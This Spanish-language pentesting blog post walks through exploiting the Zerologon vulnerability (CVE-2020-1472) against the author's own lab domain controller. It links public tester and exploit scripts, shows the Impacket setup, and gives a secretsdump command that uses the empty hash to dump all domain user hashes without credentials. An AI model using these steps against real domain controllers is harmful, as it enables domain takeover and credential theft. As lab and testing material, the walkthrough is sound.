---
layout: single
title: Cómo explotar la vulnerabilidad Zerologon
excerpt: "Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo."
date: 2020-09-16
classes: wide
header:
  teaser: /assets/images/zerologon/zerologon.png
  teaser_home_page: true
categories:
  - Research
  - Utilidades
  - Exploits
  - Vulnerabilidades
tags:
  - Pentesting
  - Herramientas
  - Windows
  - Linux
  - Domain Controller
  - Guías
  - Privilege Escalation
---

![](/assets/images/zerologon/zerologon.png)

## ¿Es realmente crítico Zerologon?

La respuesta es un **si** rotundo. No creo que haga falta a estas alturas comentar qué es Zerologon... ya existen montón de artículos a disposición detallando de forma técnica y ejecutiva en qué consiste la vulnerabilidad.

Centrémonos en la explotación, ¿cómo se explota zerologon?, vamos a ello. En mi caso comenzaré haciendo uso de la siguiente utilidad:

* [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

Este recurso, nos permitirá a través del script `zerologon_tester.py`, saber si el DC en cuestión es vulnerable ante el ataque. Yo ya dispongo de un DC virtualizado contra el que lanzar el tester, en caso de no contar con uno, te recomiendo hacer uso de la utilidad '**AD-AutomationLab**', una herramienta en PowerShell que desarrollé para el despliegue automatizado de un Domain Controller entre otras cosas (también es capaz de configurar vulnerabilidades reconocidas sobre el servidor).

Por aquí os dejo el enlace para aquellos/as que lo quieran usar:

* [https://github.com/s4vitar/AD-AutomationLab](https://github.com/s4vitar/AD-AutomationLab)


## ¿Cómo se explota la vulnerabilidad Zerologon?

Una vez tengamos ya el Domain Controller operando, podremos empezar. La dirección IP de mi DC en este caso es la `192.168.101.130`, y la dirección IP de mi equipo atacante la `192.168.101.128`.

Partiendo de este punto, estos son los resultados obtenidos al lanzar el tester sobre el DC:

<p align="center">
<img src="/assets/images/zerologon/1.png">
</p>

Toda la información referente al nombre de equipo, dominio y demás puede obtenerse rápidamente desde CrackMapExec con un simple escaneo por Samba:

<p align="center">
<img src="/assets/images/zerologon/2.png">
</p>

En base a los resultados de la primera foto, vemos que el DC es vulnerable. Lo único que nos queda por tanto es explotar la vulnerabilidad.

En esta ocasión, estaré usando el siguiente recurso de la plataforma de GitHub:

* [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

Esta utilidad cuenta con un script de nombre `cve-2020-1472-exploit.py`, el cual como información nos solicita el nombre del equipo y la dirección IP de la máquina víctima.

Antes de explotar la vulnerabilidad, para evitar problemas con Impacket, recomiendo tirar de `virtualenv` para tras su instalación ejecutar posteriormente la herramienta. Sería seguir básicamente los siguientes pasos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #virtualenv zerologon
created virtual environment CPython3.8.2.final.0-64 in 178ms
  creator CPython3Posix(dest=/home/s4vitar/Desktop/zerologon, clear=False, global=False)
  seeder FromAppData(download=False, CacheControl=latest, appdirs=latest, certifi=latest, chardet=latest, colorama=latest, contextlib2=latest, distlib=latest, distro=latest, html5lib=latest, idna=latest, ipaddr=latest, lockfile=latest, msgpack=latest, packaging=latest, pep517=latest, pip=latest, pkg_resources=latest, progress=latest, pyparsing=latest, pytoml=latest, requests=latest, retrying=latest, setuptools=latest, six=latest, urllib3=latest, webencodings=latest, wheel=latest, via=copy, app_data_dir=/root/.local/share/virtualenv/seed-app-data/v1.0.1.debian)
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #source zerologon/bin/activate
(zerologon) ┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cd /opt/
(zerologon) ┌─[root@parrot]─[/opt]
└──╼ #git clone https://github.com/SecureAuthCorp/impacket
Clonando en 'impacket'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 18517 (delta 19), reused 26 (delta 13), pack-reused 18478
Recibiendo objetos: 100% (18517/18517), 6.17 MiB | 5.96 MiB/s, listo.
Resolviendo deltas: 100% (14103/14103), listo.
(zerologon) ┌─[root@parrot]─[/opt]
└──╼ #cd impacket/
(zerologon) ┌─[root@parrot]─[/opt/impacket]
└──╼ #python3 setup.py install

...

```

Una vez hecho, la ejecución del exploit debe devolver un output como este en caso de éxito:

<p align="center">
<img src="/assets/images/zerologon/3.png">
</p>

Si esto es así, ya todo lo demás está hecho. Lo único que tendríamos que hacer, tal y como nos indica el README del siguiente recurso:

* [https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)

Sería ejecutar la siguiente sentencia:

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
```

Para mi caso quedaría de la siguiente forma:

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 's4vicorp/DC-Company$@192.168.101.130'
```

Obteniendo los siguientes resultados tras su ejecución:

<p align="center">
<img src="/assets/images/zerologon/4.png">
</p>

Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción `--ntds vss`, pero claro... en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)
